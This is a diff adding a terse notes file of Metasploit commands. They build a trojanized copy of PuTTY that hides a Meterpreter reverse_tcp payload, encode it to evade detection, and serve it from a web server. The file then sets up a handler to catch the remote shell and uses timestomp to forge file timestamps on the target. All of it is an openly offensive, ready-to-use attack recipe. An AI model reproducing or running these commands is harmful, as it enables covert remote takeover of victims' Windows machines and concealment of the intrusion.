@@ -1,0 +1,27 @@
+kali 2.0 
+
+wget http://192.168.0.122/tools/putty.exe
+
+msfvenom -a x86 --platform windows -x /root/putty.exe -k -p windows/meterpreter/reverse_tcp lhost=kali-ip lport=* -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o dangal.exe
+
+service apache2 start
+
+cp file.exe /var/www/html
+
+msfconsole:
+
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+show options
+set lhost kali-ip
+set lport *
+run
+-----------------------------
+Old version
+
+msfpayload windows/meterpreter/reverse_tcp LHOST=kali-ip LPORT=* R | msfencode -e x86/shikata_ga_nai -c 4 -t exe -o file.exe -x /root/putty.exe -k
+---------
+timestomp *.txt -c "mm/dd/yyyy 14:13:23"
+timestomp *.txt -a "mm/dd/yyyy 14:13:23"
+timestomp *.txt -m "mm/dd/yyyy 14:13:23"
+timestomp *.txt -e "mm/dd/yyyy 14:13:23"
